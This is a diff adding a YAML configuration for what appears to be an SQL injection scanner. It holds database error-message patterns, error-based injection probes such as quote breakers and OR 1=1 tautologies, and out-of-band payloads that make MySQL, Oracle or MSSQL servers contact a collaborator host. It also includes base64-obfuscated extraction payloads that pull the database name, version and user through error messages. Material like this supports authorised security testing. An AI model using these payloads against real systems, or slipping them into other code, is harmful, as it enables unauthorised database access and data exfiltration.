@@ -1,0 +1,72 @@
+SQL_ERROR_PATTERNS:
+- you have an error in your sql syntax
+- 'warning: mysql_fetch_array()'
+- supplied argument is not a valid mysql result resource
+- unknown column '[^']+' in 'where clause'
+- unclosed quotation mark after the character string
+- quoted string not properly terminated
+- invalid column name
+- sqlsrv_fetch_array()
+- 'ora-00933: sql command not properly ended'
+- 'ora-01756: quoted string not properly terminated'
+- 'ora-00942: table or view does not exist'
+- 'ora-01400: cannot insert null into'
+- postgresql query failed
+- unterminated quoted string
+- syntax error at or near
+- invalid input syntax for type
+- sqlite3.operationalerror
+- no such column
+- syntax error
+- sql error
+- syntax error
+- invalid syntax
+- incorrect syntax
+- unclosed quote
+- database error
+- syntax error near
+- unexpected
+- invalid query
+- query failed
+ERROR_BASED_PAYLOADS:
+- - ''''
+  - QUOTE_SINGLE
+- - ''''''
+  - QUOTE_SINGLE_ESCAPED
+- - '"'
+  - QUOTE_DOUBLE
+- - \\
+  - BACKSLASH
+- - '`'
+  - QUOTE_BACKTICK
+- - --
+  - COMMENT_HYPHEN
+- - ''';--'
+  - COMMENT_HYPHEN_TERMINATED
+- - ' OR 1=1'
+  - TAUTOLOGY_OR
+- - ' OR 1=1#'
+  - TAUTOLOGY_OR_COMMENT
+- - ' OR 1=1--'
+  - TAUTOLOGY_OR_COMMENT
+- - ' HAVING 1=1'
+  - HAVING_CLAUSE
+- - ' AND 1=1'
+  - TAUTOLOGY_AND
+- - ' ORDER BY 1'
+  - ORDER_BY
+OOB_PAYLOADS:
+- ' AND (SELECT LOAD_FILE(CONCAT(''\\\\'', UUID(), ''.{collaborator_url}'')))'
+- ' AND UTL_INADDR.GET_HOST_ADDRESS(''{collaborator_url}'') IS NOT NULL'
+- ' AND 1=(SELECT 1 FROM OPENROWSET(''SQLNCLI'', ''Server={collaborator_url};'', ''SELECT
+  1''))'
+EXTRACTION_PAYLOADS_B64:
+  error_based_mysql:
+  - IEFORCBFWFRSQUNUVkFMVUUoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpKQ==
+  - IEFORCBVUERBVEVYTUwoUkFOREAoKSxDT05DQVQoMHg3ZSwoe3F1ZXJ5fSkpLFJBTkQoKSk=
+  error_based_mssql:
+  - IEFORCAxPUNPTlZFUlQoaW50LCAoe3F1ZXJ5fSkp
+EXTRACTION_QUERIES_B64:
+  database: REFUQUJBU0UoKQ==
+  version: VkVSU0lPTigp
+  user: VVNFUigp
